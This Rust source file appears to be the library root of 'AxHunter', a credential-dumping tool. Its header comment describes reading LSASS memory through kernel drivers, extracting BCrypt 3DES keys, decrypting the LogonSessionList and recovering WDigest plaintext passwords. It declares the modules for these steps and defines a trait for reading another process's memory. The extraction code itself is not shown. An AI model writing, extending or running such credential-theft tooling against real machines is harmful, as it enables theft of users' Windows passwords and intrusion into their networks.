//! Driver-agnostic LSA credential extraction.
//!
//! Consumers implement the `MemReader` trait for whatever gives them access
//! to another process's virtual memory (in AxHunter, that's either
//! `ReadProcessMemory` against a kernel-minted handle, or cmd 787 driver-side
//! byte-copy). Everything above the trait — LDR module walk, BCrypt 3DES key
//! extraction, `LogonSessionList` decrypt, WDigest plaintext recovery — is
//! shared between AxHunter v1 (xhunter1.sys) and AxHunter v2 (xhunter2.sys).

#![allow(non_snake_case, non_camel_case_types)]

pub mod logon;
pub mod lsa;
pub mod pe;
pub mod sys;
pub mod wdigest;

/// Trait implemented by anything that can read target-process memory.
/// The credential-extraction modules operate over any implementation.
pub trait MemReader {
    fn read(&self, addr: u64, buf: &mut [u8]) -> bool;

    fn read_u32(&self, addr: u64) -> u32 {
        let mut b = [0u8; 4];
        if self.read(addr, &mut b) { u32::from_le_bytes(b) } else { 0 }
    }

    fn read_u64(&self, addr: u64) -> u64 {
        let mut b = [0u8; 8];
        if self.read(addr, &mut b) { u64::from_le_bytes(b) } else { 0 }
    }

    fn read_bytes(&self, addr: u64, n: usize) -> Vec<u8> {
        let mut v = vec![0u8; n];
        self.read(addr, &mut v);
        v
    }

    fn read_unicode_string(&self, va: u64) -> String {
        let hdr = self.read_bytes(va, 16);
        if hdr.len() < 16 { return String::new(); }
        let length = u16::from_le_bytes([hdr[0], hdr[1]]) as usize;
        if length == 0 || length > 512 { return String::new(); }
        let buf_va = u64::from_le_bytes(hdr[8..16].try_into().unwrap());
        if buf_va == 0 { return String::new(); }
        let raw = self.read_bytes(buf_va, length);
        let utf16: Vec<u16> = raw
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .take_while(|&c| c != 0)
            .collect();
        String::from_utf16_lossy(&utf16)
    }
}
